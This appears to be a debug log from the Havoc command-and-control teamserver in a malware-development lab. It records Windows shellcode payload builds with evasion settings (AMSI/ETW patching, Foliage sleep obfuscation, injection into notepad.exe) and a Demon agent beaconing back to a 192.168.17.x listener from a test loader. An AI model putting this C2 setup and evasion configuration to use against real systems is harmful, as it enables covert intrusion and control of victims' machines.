              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

  	 pwn and elevate until it's done

[06:27:39] [DBUG] [cmd.init.func2:59]: Debug mode enabled
[06:27:39] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[06:27:39] [INFO] Havoc profile: ./profiles/havoc.yaotl
[06:27:39] [INFO] Build: 
 - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[06:27:39] [INFO] Time: 12/07/2024 06:27:39
[06:27:39] [INFO] Teamserver logs saved under: data/loot/2024.07.12._06:27:39
[06:27:39] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
[06:27:39] [INFO] Starting Teamserver on wss://0.0.0.0:40056
[06:27:39] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
[06:27:39] [INFO] Opens existing database: data/teamserver.db
[06:27:39] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
[06:27:39] [INFO] Starting 1 listeners from last session
[06:27:39] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
[06:27:39] [INFO] Started "1" listener: http://192.168.17.137:80
[06:27:39] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
[06:27:39] [DBUG] [certs.generateCertificate:223]: Valid from 2023-11-28 06:27:39.757350472 -0500 EST to 2026-11-27 06:27:39.757350472 -0500 EST
[06:27:39] [DBUG] [certs.generateCertificate:228]: Serial Number: 332058351669910663427278624473247729120
[06:27:39] [DBUG] [certs.generateCertificate:234]: Authority certificate
[06:27:39] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
[06:27:39] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
[06:27:39] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
[06:27:43] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
[06:27:43] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
[06:27:43] [GOOD] User <5pider> Authenticated
[06:27:47] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:27:47] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:None Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:None (LdrLoadDll) Sleep:2 Sleep Jmp Gadget:None Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:27:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/ba90213821/e6c93d8f7f.o
[06:27:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/ba90213821/b57417b0e0.o
[06:27:47] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
[06:27:47] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:27:47] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:None Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:None (LdrLoadDll) Sleep:2 Sleep Jmp Gadget:None Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:27:47] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:27:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/2e6046e478/de956302a2.o
[06:27:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/2e6046e478/b147337518.o
[06:27:47] [DBUG] [builder.(*Builder).Build:379]: Compile dll
[06:28:43] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
[06:28:54] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 6462235e
[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (6462235e) == DemonID (6462235e)

[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
Hostname: WINDEV2401EVAL
Username: User
Domain  : 
InternIP: 192.168.17.131
ExternIP: 192.168.17.131

[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
ProcessPID  : 9764
ProcessTID  : 11800
ProcessPPID : 0
ProcessArch : 2
Elevated    : 0
Base Address: 0x206a3700000

[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
SleepDelay  : 2
SleepJitter : 15

[06:28:54] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
[06:28:54] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
[06:28:54] [DBUG] [handlers.handleDemonAgent:295]: Finished request
[06:29:04] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 6462235e, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
[06:30:17] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:30:17] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rbx Sleep Technique:Foliage Stack Duplication:false]
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:30:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/5a1dd26b99/e124135719.o
[06:30:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/5a1dd26b99/a3e8dd79b3.o
[06:30:17] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
[06:30:17] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:30:17] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rbx Sleep Technique:Foliage Stack Duplication:false]
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:30:17] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:30:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/d3d67058c9/c9763f474d.o
[06:30:17] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/d3d67058c9/afd3fb104b.o
[06:30:17] [DBUG] [builder.(*Builder).Build:379]: Compile dll
[06:31:13] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
